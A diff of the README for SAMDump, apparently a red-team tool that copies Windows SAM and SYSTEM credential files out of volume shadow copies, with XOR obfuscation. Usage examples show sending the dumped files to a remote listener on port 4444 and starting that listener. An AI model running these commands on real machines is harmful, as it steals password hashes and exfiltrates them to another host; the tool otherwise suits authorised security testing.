@@ -2,7 +2,7 @@
 
 Extract Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS) with multiple exfiltration options and XOR obfuscation.
 
-- List volume shadow copies using VSS and create one if necessary
+- Lists volume shadow copies using VSS and creates one if necessary
 - Extracts SAM and SYSTEM files from shadow copies
 - Uses direct NT API calls for file operations
 - Supports XOR encoding for obfuscation
@@ -37,7 +37,7 @@ SAMDump.exe --save-local --output-dir "C:\temp"
 Save locally with XOR encoding:
 
 ```
-SAMDump.exe --save-local --xor-encode --xor-key "MySecretKey"
+SAMDump.exe --save-local --xor-encode --xor-key "SAMDump2025"
 ```
 
 Send to remote server with XOR encoding:
@@ -46,6 +46,8 @@ Send to remote server with XOR encoding:
 SAMDump.exe --send-remote --host 192.168.1.100 --port 4444 --xor-encode
 ```
 
+
+<br>
 
 ## Server to receive the files
 
@@ -65,6 +67,9 @@ Listener on specific interface and port with XOR key:
 ```
 python server.py --host 192.168.1.100 --port 4444 --xor-key "SAMDump2025"
 ```
+
+
+<br>
 
 ## Script to decode the files
 
